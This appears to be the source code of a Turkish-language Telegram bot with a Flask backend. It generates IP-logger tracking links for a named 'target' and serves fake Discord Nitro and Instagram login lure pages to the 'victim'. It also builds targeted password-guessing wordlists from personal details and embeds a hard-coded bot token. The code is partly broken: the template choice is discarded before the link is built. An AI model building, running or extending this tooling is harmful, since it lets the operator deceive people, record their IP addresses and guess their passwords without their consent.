import logging
import socket
import hashlib
import requests
import random
import string
import base64
import sqlite3
import math
import io
import threading
from flask import Flask, request, redirect, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

user_states = {}
user_data_temp = {}
BOT_TOKEN = "9097385055:AAEeGkOBPF6YPh6dtvbC2alHJS0DpB6qY0k"
SERVER_URL = "http://localhost:5000" 

ADMINS = ["Lagge_bab", "FLex3pqppq"]

def is_admin(username):
    if not username: return False
    return username in ADMINS

def init_db():
    conn = sqlite3.connect('laggeosint.db')
    cursor = conn.cursor()
    cursor.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, invites INTEGER DEFAULT 0, referred_by INTEGER)')
    cursor.execute('CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, target TEXT, ip TEXT, agent TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
    conn.commit()
    conn.close()

init_db()

def get_user(user_id, username=None):
    conn = sqlite3.connect('laggeosint.db')
    cursor = conn.cursor()
    cursor.execute('SELECT invites, referred_by FROM users WHERE user_id = ?', (user_id,))
    row = cursor.fetchone()
    if not row:
        cursor.execute('INSERT INTO users (user_id, username, invites) VALUES (?, ?, 0)', (user_id, username))
        conn.commit()
        row = (0, None)
    conn.close()
    return {"invites": row[0], "referred_by": row[1]}

def add_invite(inviter_id, new_user_id):
    conn = sqlite3.connect('laggeosint.db')
    cursor = conn.cursor()
    cursor.execute('SELECT referred_by FROM users WHERE user_id = ?', (new_user_id,))
    row = cursor.fetchone()
    if row and row[0] is None and inviter_id != new_user_id:
        cursor.execute('UPDATE users SET referred_by = ? WHERE user_id = ?', (inviter_id, new_user_id))
        cursor.execute('UPDATE users SET invites = invites + 1 WHERE user_id = ?', (inviter_id,))
        conn.commit()
    conn.close()

def get_total_users():
    conn = sqlite3.connect('laggeosint.db')
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM users')
    count = cursor.fetchone()[0]
    conn.close()
    return count

flask_app = Flask(__name__)

@flask_app.route('/track')
def track_user():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    ref_id = request.args.get('ref', 'Bilinmiyor')
    target_name = request.args.get('target', 'Hedef')
    template_type = request.args.get('tmpl', 'redirect')
    redir_url = request.args.get('redir', 'https://google.com')

    try:
        conn = sqlite3.connect('laggeosint.db')
        cursor = conn.cursor()
        cursor.execute('INSERT INTO logs (owner_id, target, ip, agent) VALUES (?, ?, ?, ?)', (ref_id, target_name, user_ip, user_agent))
        conn.commit()
        conn.close()
    except:
        pass

    if template_type == 'nitro':
        html = '<html><head><title>Discord Nitro Gift</title></head><body style="background:#36393f;color:white;text-align:center;font-family:Arial;padding-top:50px;"><h2>🎁 You\'ve been gifted a Discord Nitro!</h2><p>Click below to claim your 1 year of free Nitro.</p><a href="{{ redir }}"><button style="background:#7289da;color:white;padding:15px 30px;border:none;border-radius:5px;font-size:16px;cursor:pointer;">Claim Now</button></a></body></html>'
        return render_template_string(html, redir=redir_url)
    elif template_type == 'instagram':
        html = '<html><head><title>Instagram - Login</title></head><body style="background:#fafafa;text-align:center;font-family:Arial;padding-top:50px;"><h2 style="font-family:Brush Script MT, cursive;font-size:40px;">Instagram</h2><div style="background:white;width:300px;margin:0 auto;padding:20px;border:1px solid #dbdbdb;"><input type="text" placeholder="Phone number, username, or email" style="width:100%;padding:10px;margin-bottom:10px;background:#fafafa;border:1px solid #dbdbdb;"><br><input type="password" placeholder="Password" style="width:100%;padding:10px;margin-bottom:10px;background:#fafafa;border:1px solid #dbdbdb;"><br><a href="{{ redir }}"><button style="width:100%;background:#0095f6;color:white;padding:8px;border:none;border-radius:4px;font-weight:bold;">Log In</button></a></div></body></html>'
        return render_template_string(html, redir=redir_url)
    else:
        return redirect(redir_url if redir_url.startswith("http") else "https://" + redir_url)

def run_flask():
    flask_app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    user_name = user.first_name
    username = user.username
    get_user(user_id, username)

    if context.args:
        arg = context.args[0]
        if arg.startswith("ref_"):
            try:
                inviter_id = int(arg.split("_")[1])
                add_invite(inviter_id, user_id)
            except:
                pass

    user_states[user_id] = None 
    
    keyboard = [
        [InlineKeyboardButton("📥 TikTok & Instagram Video İndir", callback_data='video_downloader')],
        [InlineKeyboardButton("🛡️ Siber Güvenlik & Hacker Araçları", callback_data='cyber_tools')],
        [InlineKeyboardButton("👤 Profilim & Davet Linkim", callback_data='profile')],
        [InlineKeyboardButton("🎓 Eğitim & Rehber", callback_data='education')],
        [InlineKeyboardButton("⚙️ Ayarlar", callback_data='settings')]
    ]

    if is_admin(username):
        keyboard.append([InlineKeyboardButton("👑 Admin Paneli", callback_data='admin_panel')])

    reply_markup = InlineKeyboardMarkup(keyboard)
    welcome_text = f"Hoş geldin, {user_name}!\nLaggeosint Ultimate Güvenlik Asistanı aktif.\n\n" + ('👑 *[Yönetici Yetkisi Aktif]*' if is_admin(username) else '🔗 **IP Logger aracını açmak için 1 arkadaşını davet etmelisin!**')

    if update.message:
        await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode="Markdown")
    elif update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(text=welcome_text, reply_markup=reply_markup, parse_mode="Markdown")

async def cyber_tools_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("🎣 IP Logger & Şablonlar", callback_data='cam_access'), InlineKeyboardButton("📊 Canlı Loglarım", callback_data='my_logs')],
        [InlineKeyboardButton("📋 Özel Wordlist Üretici", callback_data='wordlist_tool')],
        [InlineKeyboardButton("🔍 Gelişmiş Phishing Link Analizi", callback_data='link_scan')],
        [InlineKeyboardButton("🔑 Şifre Entropi & Güç Testi", callback_data='pass_strength'), InlineKeyboardButton("📱 User-Agent Çözümleyici", callback_data='ua_parser')],
        [InlineKeyboardButton("🌐 IP / WHOIS Bilgisi", callback_data='ip_info'), InlineKeyboardButton("🛡️ Header Kontrolü", callback_data='link_check')],
        [InlineKeyboardButton("🕵️ Kullanıcı Adı OSINT", callback_data='username_osint'), InlineKeyboardButton("📧 E-posta Sızıntı Testi", callback_data='email_leak')],
        [InlineKeyboardButton("🌐 Subdomain Taraması", callback_data='subdomain_scan'), InlineKeyboardButton("🔍 Port Taraması (Nmap)", callback_data='nmap_scan')],
        [InlineKeyboardButton("🔑 Base64 & Hash Kırıcı", callback_data='base64_tool'), InlineKeyboardButton("📡 DNS Sorgulama", callback_data='dns_lookup')],
        [InlineKeyboardButton("🔐 Şifre Üretici", callback_data='gen_pass'), InlineKeyboardButton("🔲 QR Kod Üret", callback_data='qr_tool')],
        [InlineKeyboardButton("🏠 Ana Menü", callback_data='main_menu')]
    ]
    await query.edit_message_text(text="🛠️ **Ultimate Hacker Araçları Menüsü**\n\nİstediğiniz gelişmiş modülü seçin:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    user = query.from_user
    user_id = user.id
    username = user.username
    user_data = get_user(user_id, username)

    back_to_tools = [[InlineKeyboardButton("🔙 Araçlar Menüsü", callback_data='cyber_tools')], [InlineKeyboardButton("🏠 Ana Menü", callback_data='main_menu')]]
    back_markup = InlineKeyboardMarkup(back_to_tools)

    if data == 'main_menu':
        user_states[user_id] = None
        await start(update, context)
        return
    elif data == 'cyber_tools':
        user_states[user_id] = None
        await cyber_tools_menu(update, context)
        return

    if data == 'admin_panel':
        if not is_admin(username):
            await query.answer("Yetkiniz yok!", show_alert=True)
            return
        admin_keyboard = [[InlineKeyboardButton("📢 Tüm Kullanıcılara Duyuru", callback_data='broadcast')], [InlineKeyboardButton("👥 Kullanıcı İstatistikleri", callback_data='admin_stats')], [InlineKeyboardButton("🔙 Ana Menü", callback_data='main_menu')]]
        await query.answer()
        await query.edit_message_text(text=f"👑 **Admin Paneli**\n\nToplam Kayıtlı Kullanıcı: `{get_total_users()}`", reply_markup=InlineKeyboardMarkup(admin_keyboard), parse_mode="Markdown")
        return

    elif data == 'broadcast':
        if not is_admin(username): return
        user_states[user_id] = 'waiting_broadcast'
        await query.answer()
        await query.edit_message_text(text="📢 **Toplu Duyuru**\n\nTüm kullanıcılara iletilecek metni yaz:", reply_markup=back_markup, parse_mode="Markdown")
        return

    elif data == 'admin_stats':
        if not is_admin(username): return
        await query.answer()
        await query.edit_message_text(text=f"📊 **İstatistikler**\n\nToplam Kullanıcı: `{get_total_users()}`", reply_markup=back_markup, parse_mode="Markdown")
        return

    if data == 'my_logs':
        conn = sqlite3.connect('laggeosint.db')
        cursor = conn.cursor()
        cursor.execute('SELECT target, ip, time FROM logs WHERE owner_id = ? ORDER BY id DESC LIMIT 5', (str(user_id),))
        rows = cursor.fetchall()
        conn.close()
        log_text = "📊 **Son Yakalanan Loglarınız (Son 5):**\n\n"
        if rows:
            for r in rows: log_text += f"🎯 Hedef: `{r[0]}`\n🌐 IP: `{r[1]}`\n⏰ Zaman: `{r[2]}`\n-------------------\n"
        else:
            log_text += "Henüz hiç tıklanan bir logunuz bulunmuyor."
        await query.answer()
        await query.edit_message_text(text=log_text, reply_markup=back_markup, parse_mode="Markdown")
        return

    if data == 'gen_pass':
        chars = string.ascii_letters + string.digits + string.punctuation
        new_pass = "".join(random.choice(chars) for _ in range(16))
        await query.answer("Şifre üretildi!")
        await query.edit_message_text(text=f"🔐 **Şifre:**\n`{new_pass}`", reply_markup=back_markup, parse_mode="Markdown")
        return
    elif data == 'profile':
        invites_count = user_data["invites"]
        bot_username = context.bot.username
        ref_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
        status_text = "👑 **Admin**" if is_admin(username) else ("✅ **Açık**" if invites_count >= 1 else "❌ **Kilitli (1 Davet Gerekli)**")
        text = f"👤 **Profil Bilgilerin:**\n\nAd: {user.first_name}\nID: `{user_id}`\n👥 Davet Sayısı: `{invites_count}`\n🔓 IP Logger Durumu: {status_text}\n\n🔗 **Davet Linkin:**\n`{ref_link}`"
        await query.answer()
        await query.edit_message_text(text=text, reply_markup=back_markup, parse_mode="Markdown")
        return
    elif data == 'education':
        await query.answer()
        await query.edit_message_text(text="🎓 **Eğitim & Rehber:** Termux ileri düzey sızma testleri.", reply_markup=back_markup, parse_mode="Markdown")
        return
    elif data == 'settings':
        await query.answer()
        await query.edit_message_text(text="⚙️ **Ayarlar:** Tüm sistemler aktif.", reply_markup=back_markup, parse_mode="Markdown")
        return

    if data == 'cam_access':
        if not is_admin(username) and user_data["invites"] < 1:
            bot_username = context.bot.username
            ref_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
            lock_text = f"🔒 **Kilitli!**\nIP Logger için 1 arkadaşını davet etmelisin.\n🔗 Linkin:\n`{ref_link}`"
            await query.answer("Kilitli!", show_alert=True)
            await query.edit_message_text(text=lock_text, reply_markup=back_markup, parse_mode="Markdown")
            return
        else:
            tmpl_keyboard = [[InlineKeyboardButton("🎁 Discord Nitro Şablonu", callback_data='tmpl_nitro')], [InlineKeyboardButton("📸 Instagram Login Şablonu", callback_data='tmpl_instagram')], [InlineKeyboardButton("🌐 Standart Yönlendirme", callback_data='tmpl_redirect')], [InlineKeyboardButton("🔙 Araçlar Menüsü", callback_data='cyber_tools')]]
            await query.answer()
            await query.edit_message_text(text="🎣 **IP Logger Şablon Seçimi**\n\nKurbana hangi sahte arayüz gösterilsin?", reply_markup=InlineKeyboardMarkup(tmpl_keyboard), parse_mode="Markdown")
            return

    if data.startswith('tmpl_'):
        tmpl_type = data.split('_')[1]
        user_data_temp[user_id] = {"tmpl": tmpl_type}
        user_states[user_id] = 'waiting_cam_target'
        await query.answer()
        await query.edit_message_text(text="🎣 **IP Logger Adım 1/2**\n\nHedef veya kampanya etiketi yazın:", reply_markup=back_markup, parse_mode="Markdown")
        return

    if data == 'video_downloader':
        user_states[user_id] = 'waiting_video_link'
        back_main = [[InlineKeyboardButton("🏠 Ana Menü", callback_data='main_menu')]]
        await query.answer()
        await query.edit_message_text(text="📥 **TikTok & Instagram Video İndirici**\n\nİndirmek istediğiniz linki gönderin:", reply_markup=InlineKeyboardMarkup(back_main), parse_mode="Markdown")
        return

    states_map = {
        'wordlist_tool': ('waiting_wordlist_info', "📋 **Özel Wordlist Üretici**\n\nHedef bilgilerini aralarında boşluk bırakarak yazın:"),
        'link_scan': ('waiting_link_scan', "🔍 **Phishing & Link Analizi**\n\nURL'yi yazın:"),
        'pass_strength': ('waiting_pass_check', "🔑 **Şifre Güç Testi**\n\nŞifreyi yazın:"),
        'ua_parser': ('waiting_ua', "📱 **User-Agent Çözümleyici**\n\nMetni yapıştırın:"),
        'ip_info': ('waiting_ip', "🌐 IP veya domain yazın:"),
        'link_check': ('waiting_header', "🛡️ URL yazın:"),
        'username_osint': ('waiting_username', "🕵️ Kullanıcı adı yazın:"),
        'email_leak': ('waiting_email', "📧 E-posta yazın:"),
        'subdomain_scan': ('waiting_subdomain', "🌐 Domain yazın:"),
        'base64_tool': ('waiting_base64', "🔑 Metin yazın:"),
        'hash_crack': ('waiting_crack', "🔓 MD5 hash yazın:"),
        'nmap_scan': ('waiting_scan', "🔍 Hedef IP yazın:"),
        'dns_lookup': ('waiting_dns', "📡 Domain yazın:"),
        'qr_tool': ('waiting_qr', "🔲 Metin veya link yazın:")
    }

    if data in states_map:
        user_states[user_id] = states_map[data][0]
        prompt = states_map[data][1]
    else:
        user_states[user_id] = None
        prompt = "📌 Seçim yapıldı."

    await query.answer()
    await query.edit_message_text(text=prompt, reply_markup=back_markup, parse_mode="Markdown")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    text = update.message.text
    state = user_states.get(user_id)

    if not state:
        await update.message.reply_text("Lütfen menüden bir araç seçin.")
        return

    if state == 'waiting_broadcast':
        user_states[user_id] = None
        if not is_admin(username): return
        conn = sqlite3.connect('laggeosint.db')
        cursor = conn.cursor()
        cursor.execute('SELECT user_id FROM users')
        all_users = cursor.fetchall()
        conn.close()
        await update.message.reply_text("[*] Duyuru gönderiliyor...")
        count = 0
        for (uid,) in all_users:
            try:
                await context.bot.send_message(chat_id=uid, text=f"📢 **Duyuru:**\n\n{text}", parse_mode="Markdown")
                count += 1
            except:
                pass
        await update.message.reply_text(f"[+] {count} kullanıcıya iletildi.")
        return

    user_states[user_id] = None

    if state == 'waiting_video_link':
        url = text.strip()
        if "tiktok.com" in url.lower() or "instagram.com" in url.lower():
            await update.message.reply_text("⏳ Medya indiriliyor...")
            try:
                api_url = f"https://tikwm.com/api/?url={url}" if "tiktok" in url.lower() else f"https://fantox-apis.vercel.app/insta?url={url}"
                res = requests.get(api_url, timeout=10).json()
                if "tiktok" in url.lower() and res.get("code") == 0:
                    video_url = res["data"]["play"]
                    title = res["data"].get("title", "TikTok Videosu")
                    await update.message.reply_video(video=video_url, caption=f"📥 **TikTok Video**\n\n📌 `{title}`", parse_mode="Markdown")
                else:
                    await update.message.reply_text(f"✅ **Medya Bağlantısı:**\n`{url}`", parse_mode="Markdown")
            except Exception as e:
                await update.message.reply_text(f"[-] Hata: {e}")
        else:
            await update.message.reply_text("[-] Geçersiz link!")
        return

    if state == 'waiting_wordlist_info':
        words = text.split()
        passwords = set()
        for w in words:
            passwords.add(w)
            passwords.add(w.lower())
            passwords.add(w.capitalize())
            for y in ["1998", "1999", "2000", "2023", "2024", "123", "1234"]:
                passwords.add(f"{w}{y}")
                passwords.add(f"{y}{w}")
        wordlist_content = "\n".join(passwords)
        bio = io.BytesIO(wordlist_content.encode('utf-8'))
        bio.name = "hedef_wordlist.txt"
        await update.message.reply_document(document=bio, caption=f"📋 **Wordlist Hazır!** Kombinasyon: `{len(passwords)}`")

    elif state == 'waiting_pass_check':
        pwd = text
        length = len(pwd)
        pool = sum([26 if any(c.islower() for c in pwd) else 0, 26 if any(c.isupper() for c in pwd) else 0, 10 if any(c.isdigit() for c in pwd) else 0, 32 if any(not c.isalnum() for c in pwd) else 0])
        entropy = length * math.log2(pool) if pool > 0 else 0
        seconds = (2 ** entropy) / 10_000_000_000
        time_str = f"{seconds:.2f} sn" if seconds < 86400 else f"{seconds/86400:.1f} gün"
        await update.message.reply_text(f"🔑 **Entropi Raporu:**\nUzunluk: `{length}`\nSkor: `{entropy:.1f} bit`\nKırma Süresi: `{time_str}`", parse_mode="Markdown")

    elif state == 'waiting_ua':
        ua = text.lower()
        os_name = "Windows" if "windows" in ua else ("Android" if "android" in ua else "Bilinmeyen")
        browser = "Chrome" if "chrome" in ua else "Bilinmeyen"
        await update.message.reply_text(f"📱 **User-Agent:**\nOS: `{os_name}`\nTarayıcı: `{browser}`", parse_mode="Markdown")

    elif state == 'waiting_link_scan':
        url = text if text.startswith("http") else "https://" + text
        risk = 65 if any(d in url.lower() for d in ["bit.ly", "t.me", "pqr.me"]) else 10
        await update.message.reply_text(f"🔍 **Analiz:** `{url}`\nRisk Puanı: %`{risk}`", parse_mode="Markdown")

    elif state == 'waiting_ip':
        try:
            res = requests.get(f"http://ip-api.com/json/{text}", timeout=5).json()
            await update.message.reply_text(f"🌐 **IP Bilgisi:**\nIP: `{res.get('query')}`\nÜlke: {res.get('country')}\nŞehir: {res.get('city')}", parse_mode="Markdown")
        except:
            await update.message.reply_text("Bulunamadı.")

    elif state == 'waiting_cam_target':
        user_data_temp[user_id] = {"target": text}
        user_states[user_id] = 'waiting_cam_redir'
        await update.message.reply_text("🎣 **Yönlendirilecek URL'yi yazın:**")

    elif state == 'waiting_cam_redir':
        target_info = user_data_temp.get(user_id, {})
        link = f"{SERVER_URL}/track?ref={user_id}&target={target_info.get('target')}&redir={text}"
        await update.message.reply_text(f"🎣 **Logger Linkiniz:**\n`{link}`", parse_mode="Markdown")

    else:
        await update.message.reply_text("✅ İşlem tamamlandı.")

if __name__ == '__main__':
    threading.Thread(target=run_flask, daemon=True).start()
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling()
